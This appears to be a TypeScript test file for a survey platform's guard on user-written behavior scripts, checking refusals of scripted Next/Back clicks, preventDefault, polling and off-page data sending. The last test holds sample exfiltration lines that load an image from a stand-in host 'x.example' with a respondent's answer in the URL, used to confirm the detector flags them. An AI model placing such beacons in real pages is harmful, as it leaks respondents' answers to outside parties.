import { test } from "node:test";
import assert from "node:assert/strict";
import { SurveyDefinition } from "@rescript/schema";
import { applySurveyActions, type SurveyAction } from "./surveyActions.js";
import { scriptAuthoringProblems, exfiltrationProblems } from "./uxScriptGuard.js";

/* S2a D13 / IM-18 / IM-24 (2026-10-30): the gate refuses silent no-ops and lets a countdown tick through */
const def = (() => {
  const empty = SurveyDefinition.parse({ meta: { id: "s", code: "S", title: "x" }, questions: [], flow: [{ type: "end", id: "e", status: "complete" }] });
  const r = applySurveyActions(empty, [{ op: "create_block", title: "Main" }, { op: "create_question", ref: "A", type: "single", text: "Brand?", options: ["Acme", "Beta"] }, { op: "create_question", ref: "B", type: "single", text: "Sat?", options: ["a", "b"], newPage: true }] as SurveyAction[]);
  return r.def;
})();
const id = (code: string) => def.questions.find((q) => q.code === code)!.id;
const add = (script: string) => applySurveyActions(def, [{ op: "create_behavior", label: "x", target: "Q2", script } as SurveyAction]).results[0];

test("pressing Next / Back or an option from a script is refused with the native route; a script's own button may be clicked", () => {
  const next = add(`rs.after(30000, function(){ document.querySelector('[data-testid="rs-next"]').click(); });`);
  assert.equal(next.ok, false);
  assert.match(next.error ?? "", /cannot press Next or Back.*rs\.goToPage.*gamified\.timed/);
  const viaVar = add(`var b = document.querySelector('[data-testid="rs-back"]'); rs.after(500, function(){ b.click(); });`);
  assert.match(viaVar.error ?? "", /cannot press Next or Back/);
  const option = add(`document.querySelectorAll('[data-qid="${id("Q2")}"] [data-rs-el="option"]')[0].click();`);
  assert.match(option.error ?? "", /cannot choose an answer.*set_default_value.*add_punch/);
  const own = add(`var b = document.createElement('button'); b.textContent = 'More'; document.querySelector('[data-qid="${id("Q2")}"]').appendChild(b); b.addEventListener('click', function(){ rs.showMessage('self', 'Hi'); }); b.click();`);
  assert.equal(own.ok, true, own.error);
});

test("preventDefault to stop navigation is refused (validation is the route); elsewhere it is left alone", () => {
  assert.match(scriptAuthoringProblems(`document.querySelector('[data-testid="rs-next"]').addEventListener('click', function(e){ e.preventDefault(); });`, def).join(" "), /preventDefault cannot stop the respondent.*set_validation/);
  assert.doesNotMatch(scriptAuthoringProblems(`document.querySelector('[data-qid="${id("Q2")}"]').addEventListener('click', function(e){ e.preventDefault(); rs.showMessage('self','x'); });`, def).join(" "), /preventDefault/);
});

test("a self-rescheduling tick that updates a display is a countdown, not polling; looking an element up each time is still polling", () => {
  const tick = add(`var n = 30; var el = document.createElement('div'); document.querySelector('[data-qid="${id("Q2")}"]').appendChild(el); function tick(){ el.textContent = n + ' s'; if (n-- <= 0) { rs.goToPage('p2'); return; } rs.after(1000, tick); } tick();`);
  assert.doesNotMatch(tick.error ?? "", /waits for an element/);
  assert.equal(tick.ok, true, tick.error);
  const poll = scriptAuthoringProblems(`function wait(){ var el = document.querySelector('.later'); if (!el) { rs.after(200, wait); return; } el.textContent = 'x'; } wait();`, def);
  assert.match(poll.join(" "), /wait\(\) waits for an element/);
});

test("a static https image in a script-made element: still refused (the page drops it), but the reason names the native route — not exfiltration", () => {
  const img = exfiltrationProblems(`var img = document.createElement('img'); img.src = 'https://example.com/beta.png'; document.querySelector('[data-qid="q1"]').appendChild(img);`);
  assert.equal(img.length, 1);
  assert.match(img[0], /cannot show an image.*content question.*set_display_logic/);
  assert.doesNotMatch(img[0], /send anything off the page/);
  // an answer reaching the address, a computed address, or a bare Image() stays exfiltration
  for (const code of [`var img = document.createElement('img'); img.src = 'https://x.example/?a=' + rs.getAnswer('Q1');`, `var i = new Image(); i.src = 'https://x.example/p.png';`, `var img = document.createElement('img'); img.src = \`https://x.example/\${rs.getAnswer('Q1')}\`;`]) {
    assert.match(exfiltrationProblems(code).join(" "), /send anything off the page/, code);
  }
});
